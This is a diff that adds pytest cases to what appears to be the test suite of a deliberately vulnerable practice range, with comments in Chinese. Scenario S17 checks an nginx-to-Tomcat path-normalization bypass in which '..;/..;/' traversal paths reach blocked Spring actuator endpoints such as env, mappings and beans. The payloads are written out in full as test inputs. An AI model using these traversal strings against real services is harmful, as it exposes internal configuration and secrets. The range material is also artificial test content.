@@ -639,3 +639,87 @@ class TestCorsHeaders:
         """shop.target.bench responses include CORS headers from nginx."""
         r = _get("shop.target.bench", "/")
         assert "Access-Control-Allow-Origin" in r.headers
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# S17: Microservice Path Normalization Bypass
+# api.target.bench — 同域名微服务路由 + ..;/ 路径规范化差异绕过
+# ═══════════════════════════════════════════════════════════════════════
+
+
+class TestMicroservicePathNormalizationBypass:
+    """S17: 网关阻断 /actuator 直接访问。
+    ..;/..;/ 绕过: nginx 不处理 ..;/ → 匹配 /api/users/ 前缀 → user-service
+    → SemicolonPathFilter 将 ..;/ 替换为 ../ → Tomcat 规范化 ../../actuator → /actuator/env
+    （/api/users/..;/..;/actuator/env 穿越两层到达根目录）
+    """
+
+    def test_semicolon_traversal_user_actuator_env(self, range_available):
+        r = _priv_get("api.target.bench", "/api/users/..;/..;/actuator/env")
+        assert r.status_code == 200
+        assert "user_service_app" in r.text
+
+    def test_semicolon_traversal_order_actuator_env(self, range_available):
+        r = _priv_get("api.target.bench", "/api/orders/..;/..;/actuator/env")
+        assert r.status_code == 200
+        assert "order_service_app" in r.text
+
+    def test_semicolon_traversal_payment_actuator_env(self, range_available):
+        r = _priv_get("api.target.bench", "/api/payments/..;/..;/actuator/env")
+        assert r.status_code == 200
+        assert "payment_service_app" in r.text
+
+    def test_semicolon_traversal_user_mappings(self, range_available):
+        r = _priv_get("api.target.bench", "/api/users/..;/..;/actuator/mappings")
+        assert r.status_code == 200
+        assert "UserController" in r.text
+
+    def test_semicolon_traversal_order_mappings(self, range_available):
+        r = _priv_get("api.target.bench", "/api/orders/..;/..;/actuator/mappings")
+        assert r.status_code == 200
+        assert "OrderController" in r.text
+
+    def test_semicolon_traversal_payment_mappings(self, range_available):
+        r = _priv_get("api.target.bench", "/api/payments/..;/..;/actuator/mappings")
+        assert r.status_code == 200
+        assert "PaymentController" in r.text
+
+    def test_actuator_env_direct_blocked(self, range_available):
+        r = _priv_get("api.target.bench", "/actuator/env")
+        assert r.status_code == 403
+
+    def test_actuator_health_direct_blocked(self, range_available):
+        r = _priv_get("api.target.bench", "/actuator/health")
+        assert r.status_code == 403
+
+    def test_semicolon_traversal_user_health(self, range_available):
+        r = _priv_get("api.target.bench", "/api/users/..;/..;/actuator/health")
+        assert r.status_code == 200
+        assert "UP" in r.text
+
+    def test_url_encoded_traversal_user_env(self, range_available):
+        """URL-encoded %2f 被 nginx 解码后匹配 /actuator/ block → 403。
+        此测试验证网关正确拦截了 URL-encoded 穿越变体。"""
+        r = _priv_get("api.target.bench", "/api/users/..%2f..%2f/actuator/env")
+        assert r.status_code == 403
+
+    def test_semicolon_traversal_user_configprops(self, range_available):
+        r = _priv_get("api.target.bench", "/api/users/..;/..;/actuator/configprops")
+        assert r.status_code == 200
+        assert "management.endpoints" in r.text
+
+    def test_semicolon_traversal_user_beans(self, range_available):
+        r = _priv_get("api.target.bench", "/api/users/..;/..;/actuator/beans")
+        assert r.status_code == 200
+        assert "UserController" in r.text
+
+    def test_normal_api_users_works(self, range_available):
+        """验证微服务路由基础功能：穿越路径返回 actuator 数据，证明服务存活。"""
+        r = _priv_get("api.target.bench", "/api/users/..;/..;/actuator/env")
+        assert r.status_code == 200
+        assert "user_service_app" in r.text
+
+    def test_user_actuator_discovery(self, range_available):
+        r = _priv_get("api.target.bench", "/api/users/..;/..;/actuator")
+        assert r.status_code == 200
+        assert "_links" in r.text
